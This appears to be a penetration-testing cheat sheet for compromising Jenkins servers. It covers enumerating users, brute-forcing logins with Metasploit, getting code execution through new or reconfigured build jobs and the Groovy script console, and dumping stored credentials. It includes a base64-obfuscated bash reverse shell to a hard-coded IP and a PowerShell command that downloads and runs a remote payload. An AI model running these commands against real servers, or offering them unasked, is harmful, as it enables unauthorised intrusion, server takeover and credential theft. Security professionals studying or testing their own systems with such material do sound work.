Jenkins
Enumeration

In order to search for interesting Jenkins pages without authentication like (/people or /asynchPeople, this lists the current users) you can use:

msf> use auxiliary/scanner/http/jenkins_enum

Check if you can execute commands without needing authentication:

msf> use auxiliary/scanner/http/jenkins_command

Without credentials you can look inside /asynchPeople/ path or  /securityRealm/user/admin/search/index?q= for usernames.

You may e ale to get the Jenkins version from the path /oops or /error
Bruteforce

Jekins does not implement any password policy or username brute-force mitigation. Then, you should always try to brute-force users because probably weak passwords are being used (even usernames as passwords or reverse usernames as passwords).

msf> use auxiliary/scanner/http/jenkins_login

Exploiting Vulnerabilities
gquere/pwn_jenkins
Notes about attacking Jenkins servers. Contribute to gquere/pwn_jenkins development by creating an account on GitHub.
github.com
Code Execution

There are 3 ways to get code execution with Jenkins.
Create a new project

This method is very noisy because you have to create a hole new project (obviously this will only work if you user is allowed to create a new project).

    Create a new project (Freestyle project)

    Inside Build section set Execute shell and paste a powershell Empire launcher or a meterpreter powershell (can be obtained using unicorn). Start the payload with PowerShell.exe instead using powershell.

    Click Build now

​

Go to the projects and check if you can configure any of them (look for the "Configure button"):

Or try to access to the path /configure in each project (example: /me/my-views/view/all/job/Project0/configure).

If you are allowed to configure the project you can make it execute commands when a build is successful:

Click on Save and build the project and your command will be executed.
If you are not executing a reverse shell but a simple command you can see the output of the command inside the output of the build.
Execute Groovy script

Best way. Less noisy.

    Go to path_jenkins/script

    Inside the text box introduce the script

def process = "PowerShell.exe <WHATEVER>".execute()
println "Found text ${process.text}"

You could execute a command using: cmd.exe /c dir

In linux you can do:  "ls /".execute().text

If you need to use quotes and single quotes inside the text. You can use """PAYLOAD""" (triple double quotes) to execute the payload.

Another useful groovy script is (replace [INSERT COMMAND]):

def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"

Reverse shell in linux

def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80MzQzIDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"

Reverse shell in windows

You can prepare a HTTP server with a PS reverse shell and use Jeking to download and execute it:

scriptblock="iex (New-Object Net.WebClient).DownloadString('http://192.168.252.1:8000/payload')"
echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0
cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc <BASE64>

MSF exploit

You can use MSF to get a reverse shell:

msf> use exploit/multi/http/jenkins_script_console

POST

Dump Jenkins credentials using:

msf> post/multi/gather/jenkins_gather

References
jenkins to meterpreter - toying with powersploit ·
leonjza.github.io
Hacking Jenkins Servers With No Password
A quick and dirty guide to hacking Jenkins servers for penetration testing purposes. Unauthenticated remote code execution before lunch time!
www.pentestgeek.com

